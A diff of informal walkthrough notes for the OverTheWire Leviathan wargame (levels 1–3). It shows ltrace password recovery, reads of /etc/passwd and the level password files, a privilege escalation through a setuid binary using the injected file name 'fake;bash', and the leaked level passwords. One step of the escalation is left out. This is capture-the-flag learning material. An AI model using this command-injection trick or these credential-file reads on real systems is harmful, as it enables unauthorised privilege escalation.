@@ -15,3 +15,18 @@ ltrace ./check
 // we see this line strcmp("hel", "sex") // the password is probably sex, we obtain a bash
 cat /etc/leviathan_pass/leviathan2
 ougahZi8Ta
+
+lvl 2 --> lvl 3
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+ls
+./printfile
+./printfile /etc/passwd // it prints out the whole file
+ls -l // answer : -r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29 21:17 printfile, the s means it is owned by leviathan3
+// the highligt over printfile meeans that it is a binary, running it allows us to benefit from the previledges that lev3 has. Previledge elevation in other words.
+./printfile /etc/leviathan_pass/leviathan3 // You cant have that file...
+mktemp -d
+cd /tmp/tmp.Q7WF3s2Lxd
+touch 'fake;bash'
+// Curiously we became leviathan3@leviathan:/tmp/tmp.Q7WF3s2Lxd$
+cat /etc/leviathan_pass/leviathan3
+Ahdiemoo1j
